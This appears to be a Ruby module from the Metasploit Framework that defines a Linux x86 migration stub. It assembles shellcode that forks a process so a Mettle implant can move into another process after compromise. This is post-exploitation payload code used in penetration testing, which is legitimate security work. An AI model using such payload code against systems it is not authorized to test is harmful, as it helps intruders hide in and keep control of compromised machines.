# -*- coding: binary -*-
# frozen_string_literal: true

module Msf
  # Payload that supports migration on x86.
  module Payload::Linux::X86::Migrate
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Linux Migration (x86)',
          'Description' => 'Migration stub x86',
          'Author' => ['Rapid7'],
          'License' => MSF_LICENSE,
          'Platform' => 'linux',
          'Arch' => ARCH_X86
        )
      )
    end

    #
    # Constructs the migrate stub on the fly.
    #
    def generate(opts = {})
      # eax - payload address
      # ebx - pid of the current Mettle process
      # ecx - file descriptor of the current transport
      asm = %(
      push eax
      push ecx
      push ebx
      mov eax, 2
      int 0x80                 ; fork()
      test eax, eax
      jz migrate_child
      int 3                    ; let the injector restore and resume the target

    migrate_child:
      #{generate_migrate(opts)}
    )

      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    end
  end
end
